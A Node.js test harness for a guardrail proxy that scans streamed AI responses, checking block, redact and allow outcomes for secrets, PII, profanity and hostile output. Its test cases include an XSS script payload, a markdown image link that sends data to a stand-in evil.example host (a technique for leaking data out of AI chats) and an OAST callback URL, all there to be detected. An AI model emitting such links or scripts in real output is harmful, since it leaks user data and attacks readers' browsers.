/*
 * Local harness for the outbound EventFlow scanner (guardrail-proxy/.../sg-outbound.js).
 * Simulates the SSE event sequence: JS-combine-resp (cumulative buffer) -> JS-SG-Outbound-Scan,
 * then checks the final action and what the client would receive (after in-flight redaction).
 *
 * Usage: node StaticGuardrails/tests/outbound_harness.js
 */
'use strict';
var fs = require('fs');
var path = require('path');
var vm = require('vm');

var ROOT = path.join(__dirname, '..', '..');
var PJSC = path.join(ROOT, 'guardrail-proxy', 'apiproxy', 'resources', 'jsc');
var SJSC = path.join(ROOT, 'StaticGuardrails', 'sharedflowbundle', 'resources', 'jsc');
var read = function (d, f) { return fs.readFileSync(path.join(d, f), 'utf8'); };
var LIB = read(PJSC, 'sg-rules.js') + '\n' + read(PJSC, 'sg-common.js') + '\n';

function loadLexicon() {
  var props = {};
  fs.readFileSync(path.join(ROOT, 'StaticGuardrails', 'env', 'sg.properties'), 'ascii').split(/\r?\n/).forEach(function (l) {
    if (!l || l.charAt(0) === '#') { return; }
    var i = l.indexOf('=');
    if (i < 0) { return; }
    props[l.substring(0, i)] = l.substring(i + 1).replace(/\\u([0-9a-fA-F]{4})/g, function (_, h) { return String.fromCharCode(parseInt(h, 16)); });
  });
  var sb = { JSON: JSON };
  vm.createContext(sb);
  vm.runInContext(LIB + 'var out = JSON.stringify(SG.loadLexicon(function (k) { return __p[k] || ""; }));', Object.assign(sb, { __p: props }));
  return sb.out;
}
var LEX = loadLexicon();

function sse(text, last) {
  var cand = { content: { role: 'model', parts: [{ text: text }] } };
  if (last) { cand.finishReason = 'STOP'; }
  return 'data: ' + JSON.stringify({ candidates: [cand] }) + '\n\n';
}

function run(chunks, outMode) {
  var vars = { 'sg.enabled': 'true', 'sg.out_mode': outMode, 'sg.lexicon': LEX };
  var ctx = {
    getVariable: function (k) { return vars.hasOwnProperty(k) ? vars[k] : null; },
    setVariable: function (k, v) { vars[k] = v; }
  };
  var sb = { context: ctx, JSON: JSON };
  vm.createContext(sb);
  var delivered = '', cum = '';
  for (var i = 0; i < chunks.length; i++) {
    vars['response.event.current.content'] = sse(chunks[i], i === chunks.length - 1);
    cum += chunks[i];                          // JS-combine-resp
    vars.response_partial = cum;
    vars.buff_ready = 'true';
    vm.runInContext(LIB + read(PJSC, 'sg-outbound.js'), sb);
    if (vars['sg.out_action'] === 'block') { return { action: 'block', rule: vars['sg.out_rule_id'], delivered: delivered, v: vars }; }
    var ev = vars['response.event.current.content'];
    delivered += JSON.parse(ev.substring(6)).candidates[0].content.parts[0].text;
  }
  return { action: 'allow', rule: vars['sg.out_rule_id'] || '', delivered: delivered, v: vars };
}

var AWS = 'AKIAIOSFODNN7EXAMPLE';
var CASES = [
  // name, chunks, mode, expected action, expected: substring that must / must not be delivered
  ['clean enforce', ['Paris is ', 'the capital.'], 'enforce', 'allow', { has: 'Paris is the capital.' }],
  ['aws key enforce', ['Your key: ', AWS, ' done'], 'enforce', 'block', { rule: 'SG-SEC-002', not: AWS }],
  ['aws key redact', ['Your key: ', AWS, ' done'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-002] done', not: AWS }],
  ['aws key split redact (hold-back)', ['AKIA', 'IOSFODNN7EXAMPLE', ' done'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-002] done', not: 'AKIA' }],
  ['email split redact (hold-back)', ['mail jane.doe@example.', 'com', ''], 'redact', 'allow', { has: 'mail [REDACTED:SG-PII-004]', not: 'jane' }],
  ['long text flushes fully', ['a'.repeat(100), 'b'.repeat(100), ' end'], 'redact', 'allow', { has: 'b'.repeat(100) + ' end' }],
  ['email redact', ['Contact ', 'jane.doe@example.com', ' today'], 'redact', 'allow', { has: '[REDACTED:SG-PII-004]', not: 'jane.doe' }],
  ['email enforce (flag only)', ['Contact jane.doe@example.com today'], 'enforce', 'allow', { has: 'jane.doe@example.com' }],
  ['nric redact', ['NRIC S1234567D ok'], 'redact', 'allow', { has: '[REDACTED:SG-PII-002]' }],
  ['card redact (luhn)', ['card 4111 1111 1111 1111 and 1234 5678 9012 3456'], 'redact', 'allow', { has: '[REDACTED:SG-PII-001] and 1234 5678 9012 3456' }],
  ['xss still blocks in redact', ['<html><scr', 'ipt>alert(1)</script>'], 'redact', 'block', { rule: 'SG-XSS-001' }],
  ['xss monitor allows', ['<script>alert(1)</script>'], 'monitor', 'allow', { has: '<script>' }],
  ['profanity redact blocks', ['you are a ', 'fucking idiot'], 'redact', 'block', { rule: 'SG-LEX-T2' }],
  ['private key redact', ['-----BEGIN RSA PRIVATE KEY-----\nMIIE'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-001]' }],
  ['key repeated twice redact', ['k1 ' + AWS, ' and again ' + AWS], 'redact', 'allow', { not: AWS }],
  ['markdown exfil enforce', ['Here: ![img](https://evil.example/p.png?d=abc)'], 'enforce', 'block', { rule: 'SG-PI-013' }],
  ['oast callback enforce', ['send it to https://abc.oast.fun now'], 'enforce', 'block', { rule: 'SG-URL-003' }],
  ['iban redact', ['IBAN GB82 WEST 1234 5698 7654 32 ok'], 'redact', 'allow', { has: '[REDACTED:SG-PII-005] ok', not: 'WEST' }],
  ['stripe key redact', ['key sk_live_' + '4eC39HqLyjWDarjtT1zdp7dc' + ' end'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-008] end' }],
  ['TW ID enforce blocks', ['\u8eab\u5206\u8b49: ', 'A123456789', ' ok'], 'enforce', 'block', { rule: 'SG-PII-010', not: 'A123456789' }],
  ['HKID redact', ['HKID A123456(3) done'], 'redact', 'allow', { has: '[REDACTED:SG-PII-011] done' }],
  ['TC prompt echo flagged only', ['\u6211\u7684\u7cfb\u7d71\u63d0\u793a\u8a5e\u662f\u4fdd\u5bc6\u7684'], 'enforce', 'allow', { has: '\u4fdd\u5bc6' }]
];

var pass = 0, fail = 0;
CASES.forEach(function (c) {
  var r = run(c[1], c[2]);
  var e = c[4] || {};
  var ok = r.action === c[3] &&
    (!e.rule || r.rule === e.rule) &&
    (!e.has || r.delivered.indexOf(e.has) !== -1) &&
    (!e.not || r.delivered.indexOf(e.not) === -1);
  if (ok) { pass++; } else { fail++; }
  console.log((ok ? 'PASS ' : 'FAIL ') + c[0].padEnd(34) + ' action=' + r.action + ' rule=' + r.rule +
    ' redactions=' + (r.v['sg.out_redactions'] || 0) + ' delivered=' + JSON.stringify(r.delivered).substring(0, 90));
});
console.log('\n' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
